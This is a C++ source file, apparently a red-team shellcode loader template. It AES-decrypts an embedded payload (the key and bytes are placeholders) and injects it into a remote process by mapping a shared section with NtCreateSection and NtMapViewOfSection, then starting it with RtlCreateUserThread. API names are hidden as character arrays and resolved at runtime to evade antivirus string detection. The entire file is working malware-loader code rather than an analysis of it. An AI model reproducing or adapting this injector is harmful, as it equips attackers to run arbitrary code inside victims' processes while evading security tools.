#include <iostream>
#include <windows.h>
#pragma comment(lib, "ntdll")

//https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection.md

typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;
using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, INT ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE(WINAPI* pGetModuleHandle)(LPCSTR lpModuleName);
typedef BOOL(WINAPI* pCryptAcquireContextW)(HCRYPTPROV* phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL(WINAPI* pCryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH* phHash);
typedef BOOL(WINAPI* pCryptHashData)(HCRYPTHASH hHash, const BYTE* pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL(WINAPI* pCryptDeriveKey)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY* phKey);
typedef BOOL(WINAPI* pCryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen);
typedef BOOL(WINAPI* pCryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL(WINAPI* pCryptDestroyHash)(HCRYPTHASH hHash);
typedef VOID(WINAPI* pSleep)(DWORD dwMilliseconds);
typedef HANDLE(WINAPI* pGetCurrentProcess)();
typedef HANDLE(WINAPI* pOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

unsigned char kernel32_str[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char ntdll_str[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
unsigned char advapi32_str[] = { 'A', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0x0 };
unsigned char getprocaddress_str[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };
unsigned char getmodulehandleA_str[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
unsigned char cryptacquirecontextw_str[] = { 'C', 'r', 'y', 'p', 't', 'A', 'c', 'q', 'u', 'i', 'r', 'e', 'C', 'o', 'n', 't', 'e', 'x', 't', 'W', 0x0 };
unsigned char cryptcreatehash_str[] = { 'C', 'r', 'y', 'p', 't', 'C', 'r', 'e', 'a', 't', 'e', 'H', 'a', 's', 'h', 0x0 };
unsigned char crypthashdata_str[] = { 'C', 'r', 'y', 'p', 't', 'H', 'a', 's', 'h', 'D', 'a', 't', 'a', 0x0 };
unsigned char cryptderivekey_str[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 'r', 'i', 'v', 'e', 'K', 'e', 'y', 0x0 };
unsigned char cryptdecrypt_str[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 'c', 'r', 'y', 'p', 't', 0x0 };
unsigned char cryptreleasecontext_str[] = { 'C', 'r', 'y', 'p', 't', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x0 };
unsigned char cryptdestroyhash_str[] = { 'C', 'r', 'y', 'p', 't', 'D', 'e', 's', 't', 'r', 'o', 'y', 'H', 'a', 's', 'h', 0x0 };
unsigned char sleep_str[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };
unsigned char ntcreatesection_str[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0x0 };
unsigned char ntmapviewofsection_str[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0x0 };
unsigned char rtlcreateuserthread_str[] = { 'R', 't', 'l', 'C', 'r', 'e', 'a', 't', 'e', 'U', 's', 'e', 'r', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
unsigned char getcurrentprocess_str[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
unsigned char openprocess_str[] = { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };

pGetProcAddress cGetProcAddress = (pGetProcAddress)GetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getprocaddress_str);
pGetModuleHandle cGetModuleHandle = (pGetModuleHandle)cGetProcAddress(GetModuleHandleA((LPCSTR)kernel32_str), (LPCSTR)getmodulehandleA_str);

BYTE payload_key[] = { <<<PAYLOADKEY>>> };
BYTE payload[] = { <<<PAYLOAD>>> };

VOID AESDecrypt(BYTE* payload, DWORD payload_len, BYTE* key, size_t keylen)
{
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	pCryptAcquireContextW cCryptAcquireContextW = (pCryptAcquireContextW)cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptacquirecontextw_str);
	pCryptCreateHash cCryptCreateHash = (pCryptCreateHash)cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptcreatehash_str);
	pCryptHashData cCryptHashData = (pCryptHashData)cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)crypthashdata_str);
	pCryptDeriveKey cCryptDeriveKey = (pCryptDeriveKey)cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptderivekey_str);
	pCryptDecrypt cCryptDecrypt = (pCryptDecrypt)cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptdecrypt_str);
	pCryptReleaseContext cCryptReleaseContext = (pCryptReleaseContext)cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptreleasecontext_str);
	pCryptDestroyHash cCryptDestroyHash = (pCryptDestroyHash)cGetProcAddress(cGetModuleHandle((LPCSTR)advapi32_str), (LPCSTR)cryptdestroyhash_str);

	cCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	cCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
	cCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
	cCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
	cCryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);

	cCryptReleaseContext(hProv, 0);
	cCryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
}

int main()
{

	AESDecrypt((LPBYTE)payload, (size_t)sizeof(payload), payload_key, (size_t)sizeof(payload_key));

	myNtCreateSection fNtCreateSection = (myNtCreateSection)cGetProcAddress(cGetModuleHandle((LPCSTR)ntdll_str), (LPCSTR)ntcreatesection_str);
	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)cGetProcAddress(cGetModuleHandle((LPCSTR)ntdll_str), (LPCSTR)ntmapviewofsection_str);
	myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)cGetProcAddress(cGetModuleHandle((LPCSTR)ntdll_str), (LPCSTR)rtlcreateuserthread_str);

	SIZE_T size = 4096;
	LARGE_INTEGER sectionSize = { (DWORD)size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

	// create a memory section
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create a view of the memory section in the local process
	pGetCurrentProcess cGetCurrentProcess = (pGetCurrentProcess)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)getcurrentprocess_str);
	fNtMapViewOfSection(sectionHandle, cGetCurrentProcess(), &localSectionAddress, 0, 0, NULL, &size, 2, 0, PAGE_READWRITE);

	// create a view of the memory section in the target process
	pOpenProcess cOpenProcess = (pOpenProcess)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)openprocess_str);
	HANDLE targetHandle = cOpenProcess(PROCESS_ALL_ACCESS, false, 3776);
	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, 0, 0, NULL, &size, 2, 0, PAGE_EXECUTE_READ);

	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, payload, sizeof(payload));

	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);

	return 0;
}
